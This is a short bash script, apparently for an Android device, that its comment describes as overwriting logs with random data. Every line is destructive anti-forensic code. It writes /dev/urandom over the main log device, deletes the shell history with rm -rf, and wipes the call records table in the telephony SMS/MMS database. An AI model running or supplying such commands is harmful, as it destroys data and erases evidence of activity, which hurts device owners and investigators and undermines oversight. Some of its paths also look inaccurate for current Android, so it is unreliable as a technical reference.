#!/bin/bash  
# Overwrite logs with random data  
dd if=/dev/urandom of=/dev/log/main && \  
rm -rf ~/.bash_history && \  
sqlite3 /data/data/com.android.providers.telephony/databases/mmssms.db "DELETE FROM calls;"  
